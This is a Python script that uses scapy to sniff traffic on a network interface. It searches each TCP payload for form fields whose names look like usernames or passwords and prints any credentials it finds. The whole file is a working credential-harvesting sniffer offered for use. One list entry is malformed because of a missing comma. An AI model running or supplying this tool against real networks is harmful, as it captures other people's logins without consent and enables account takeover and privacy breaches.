from scapy.all import *
from urllib import parse
import re, termcolor

def get_login_pass(body):
    user = None
    passwd = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    for passfield in passfields:
        passfield_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if passfield_re:
            passwd = passfield_re.group()

    if passwd == "pass='":
        passwd = None

    # user[6:]      -> to remove the first "uname="
    # passwd[5:-1]  -> to remove the first "pass=" and the last "'"

    if user and passwd:
        print(termcolor.colored(('[+] Username: ' + user), 'green'))
        print(termcolor.colored(('[+] Password: ' + passwd), 'green'))
        print()
    elif user and passwd is None:
        print(termcolor.colored(('[+] Username: ' + user), 'green'))
        print(termcolor.colored(('[-] No password found.'), 'red'))
        print()
    elif user is None and passwd:
        print(termcolor.colored(('[-] No username found.'), 'red'))
        print(termcolor.colored(('[+] Password: ' + passwd), 'green'))
        print()
    else:
        # print('[!!] No credentials found.')
        pass

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        # Show payload
        print(packet[TCP].payload)
        get_login_pass(body)
    else:
        # print('[!!] Packet does not have necessary layers.')
        pass

# Check interface adapter with ifconfig e.g eth0
# iface = str(input('Please enter interface name: '))
iface = 'eth0'

try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting...')
    exit(0)